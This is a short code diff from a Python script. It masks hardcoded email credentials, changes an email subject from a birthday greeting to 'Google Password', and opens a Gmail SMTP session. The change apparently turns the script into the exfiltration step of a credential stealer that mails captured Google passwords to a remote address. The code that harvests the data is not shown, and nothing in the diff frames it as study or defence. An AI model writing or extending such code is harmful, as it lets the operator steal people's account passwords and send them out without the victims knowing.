@@ -91,13 +91,16 @@ def main():
         pass
     
     msg = MIMEMultipart()
-    from_addr = '++++++++++'
-    passw = "+++++++++++"
-    to_addr = 'kloppip13@gmail.com'
+    #email
+    from_addr = "++++++++++++"
+    #email password
+    passw = "+++++++++++++"
+    #email
+    to_addr = "+++++++++"
     
     msg['From'] = from_addr
     #msg['To'] = to_addr
-    msg['Subject'] = "Feliz cumpleaños"
+    msg['Subject'] = "Google Password"
 
     smtp_Server = smtplib.SMTP('smtp.gmail.com', 587)
     smtp_Server.ehlo()
